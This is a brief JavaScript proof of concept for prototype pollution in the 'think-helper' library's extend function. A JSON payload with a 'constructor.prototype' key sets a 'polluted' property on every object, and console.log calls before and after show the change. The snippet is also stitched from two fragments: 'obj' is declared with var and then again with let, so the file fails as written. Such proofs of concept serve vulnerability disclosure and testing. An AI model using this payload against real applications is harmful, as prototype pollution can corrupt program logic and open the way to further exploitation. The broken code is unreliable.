var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const a = require('think-helper');
let obj = {};
console.log({}.polluted);
a.extend(obj, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);